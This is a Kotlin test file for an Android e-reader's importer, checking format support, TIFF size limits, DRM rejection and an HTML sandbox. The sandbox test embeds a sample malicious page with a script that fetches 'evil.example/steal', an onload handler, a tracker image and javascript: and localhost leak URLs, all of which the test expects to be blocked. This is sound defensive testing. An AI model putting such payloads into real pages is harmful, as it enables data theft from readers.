package com.solerunner26.zeusreader.data.importer

import android.content.Context
import androidx.room.Room
import androidx.test.core.app.ApplicationProvider
import androidx.test.ext.junit.runners.AndroidJUnit4
import com.solerunner26.zeusreader.data.RoomLibraryRepository
import com.solerunner26.zeusreader.data.local.ZeusReaderDatabase
import com.solerunner26.zeusreader.reader.html.HtmlSandboxPolicy
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.test.runTest
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.annotation.Config
import java.io.ByteArrayInputStream
import java.io.ByteArrayOutputStream
import java.io.File
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

@RunWith(AndroidJUnit4::class)
@Config(sdk = [35])
class ExpandedFormatsTest {

    private lateinit var context: Context
    private lateinit var database: ZeusReaderDatabase
    private lateinit var repository: RoomLibraryRepository
    private lateinit var importer: LibraryImporter

    @Before
    fun setup() {
        context = ApplicationProvider.getApplicationContext()
        File(context.filesDir, "library_originals").deleteRecursively()
        database = Room.inMemoryDatabaseBuilder(context, ZeusReaderDatabase::class.java)
            .allowMainThreadQueries()
            .build()
        val dao = database.libraryDao()
        repository = RoomLibraryRepository(dao)
        importer = LibraryImporter(context, dao)
    }

    @After
    fun tearDown() {
        database.close()
        File(context.filesDir, "library_originals").deleteRecursively()
    }

    @Test
    fun importsXpsOxpsCbzHtmlAndValidTiffCleanly() = runTest {
        val xpsBytes = createZipBytes(
            "[Content_Types].xml" to "<Types/>".toByteArray(),
            "FixedDocumentSequence.fdseq" to "<FixedDocumentSequence/>".toByteArray()
        )
        val oxpsBytes = createZipBytes(
            "[Content_Types].xml" to "<Types/>".toByteArray(),
            "Documents/1/Pages/1.fpage" to "<FixedPage/>".toByteArray()
        )
        val cbzBytes = createZipBytes(
            "001.jpg" to byteArrayOf(0xFF.toByte(), 0xD8.toByte(), 0xFF.toByte(), 0xE0.toByte())
        )
        val htmlBytes = "<!DOCTYPE html><html><body><p>Hello HTML</p></body></html>".toByteArray()
        val tiff2Pages = createSyntheticTiffBytes(pageCount = 2)

        val report = importer.importSources(
            listOf(
                ImportSource("Manual.xps") { ByteArrayInputStream(xpsBytes) },
                ImportSource("Spec.oxps") { ByteArrayInputStream(oxpsBytes) },
                ImportSource("Manga_Vol1.cbz") { ByteArrayInputStream(cbzBytes) },
                ImportSource("Article.html") { ByteArrayInputStream(htmlBytes) },
                ImportSource("Plates.tiff") { ByteArrayInputStream(tiff2Pages) }
            )
        )

        assertEquals(5, report.importedBooks.size)
        assertTrue(report.rejected.isEmpty())
        assertEquals(setOf("XPS", "OXPS", "CBZ", "HTML", "TIFF"), report.importedBooks.map { it.format }.toSet())
    }

    @Test
    fun rejects150PageTiffAndOversizedTiffAndRetainsOxpKfxInUnsupportedList() = runTest {
        val tiff150Pages = createSyntheticTiffBytes(pageCount = 150)
        val tiff150File = File(context.cacheDir, "big150.tiff").apply { writeBytes(tiff150Pages) }
        val over30MbCheck = TiffGuard.validate(tiff150File, reportedByteSize = 31L * 1024L * 1024L)
        assertTrue(over30MbCheck is TiffGuardResult.Rejected)
        assertTrue((over30MbCheck as TiffGuardResult.Rejected).reason.contains("30 MB"))
        tiff150File.delete()

        val drmEpubBytes = createZipBytes(
            "mimetype" to "application/epub+zip".toByteArray(),
            "META-INF/container.xml" to "<container/>".toByteArray(),
            "META-INF/encryption.xml" to "<encryption/>".toByteArray()
        )

        val report = importer.importSources(
            listOf(
                ImportSource("scan_150_pages.tiff") { ByteArrayInputStream(tiff150Pages) },
                ImportSource("broken.oxp") { ByteArrayInputStream("PK\u0003\u0004dummy".toByteArray()) },
                ImportSource("kindle_book.kfx") { ByteArrayInputStream("DRMBOOK".toByteArray()) },
                ImportSource("locked.epub") { ByteArrayInputStream(drmEpubBytes) }
            )
        )

        assertEquals(0, report.importedBooks.size)
        assertEquals(4, report.rejected.size)

        val unsupported = repository.observeUnsupportedFiles().first()
        assertEquals(4, unsupported.size)
        assertTrue(unsupported.any { it.displayName == "scan_150_pages.tiff" && it.reason.contains("150 pages") })
        assertTrue(unsupported.any { it.displayName == "broken.oxp" })
        assertTrue(unsupported.any { it.displayName == "kindle_book.kfx" })
        assertTrue(unsupported.any { it.displayName == "locked.epub" && it.reason.contains("DRM") })
    }

    @Test
    fun htmlSandbox_stripsScriptsBlocksRemoteNetworkAndAllowsLocalRelativeImages() {
        val baseDir = File(context.filesDir, "html_book_sample").apply { mkdirs() }
        val localImg = File(baseDir, "images/diagram.png").apply {
            parentFile?.mkdirs()
            writeBytes(byteArrayOf(1, 2, 3))
        }
        val outsideFile = File(context.filesDir, "secret.png").apply { writeBytes(byteArrayOf(9)) }

        val dirty = """
            <html>
              <head><script>fetch('https://evil.example/steal')</script></head>
              <body onload="evil()">
                <img src="https://evil.example/tracker.png"/>
                <img src="images/diagram.png"/>
              </body>
            </html>
        """.trimIndent()
        val sanitized = HtmlSandboxPolicy.sanitizeHtmlDocument(dirty)
        assertFalse(sanitized.contains("<script", ignoreCase = true))
        assertFalse(sanitized.contains("onload=", ignoreCase = true))
        assertTrue(sanitized.contains("images/diagram.png"))

        assertFalse(HtmlSandboxPolicy.isRequestAllowed("https://evil.example/tracker.png", baseDir))
        assertFalse(HtmlSandboxPolicy.isRequestAllowed("http://127.0.0.1:8080/leak", baseDir))
        assertFalse(HtmlSandboxPolicy.isRequestAllowed("javascript:alert(1)", baseDir))
        assertFalse(HtmlSandboxPolicy.isRequestAllowed(outsideFile.toURI().toString(), baseDir))
        assertTrue(HtmlSandboxPolicy.isRequestAllowed(localImg.toURI().toString(), baseDir))

        baseDir.deleteRecursively()
        outsideFile.delete()
    }

    private fun createZipBytes(vararg entries: Pair<String, ByteArray>): ByteArray =
        ByteArrayOutputStream().use { baos ->
            ZipOutputStream(baos).use { zip ->
                for ((name, data) in entries) {
                    zip.putNextEntry(ZipEntry(name))
                    zip.write(data)
                    zip.closeEntry()
                }
            }
            baos.toByteArray()
        }

    /** Builds a valid little-endian TIFF header + IFD chain of [pageCount] pages without raster payload. */
    private fun createSyntheticTiffBytes(pageCount: Int): ByteArray {
        val ifdSize = 2 + 12 + 4 // entryCount(2) + 1 dummy tag(12) + nextOffset(4) = 18 bytes
        val totalSize = 8 + pageCount * ifdSize
        val buf = ByteBuffer.allocate(totalSize).order(ByteOrder.LITTLE_ENDIAN)
        buf.put('I'.code.toByte())
        buf.put('I'.code.toByte())
        buf.putShort(42.toShort())
        buf.putInt(8) // first IFD offset

        for (i in 0 until pageCount) {
            val currentOffset = 8 + i * ifdSize
            buf.position(currentOffset)
            buf.putShort(1.toShort()) // 1 directory entry
            buf.putShort(256.toShort()) // ImageWidth tag
            buf.putShort(4.toShort()) // LONG
            buf.putInt(1) // count
            buf.putInt(100) // value
            val nextOffset = if (i + 1 < pageCount) currentOffset + ifdSize else 0
            buf.putInt(nextOffset)
        }
        return buf.array()
    }
}
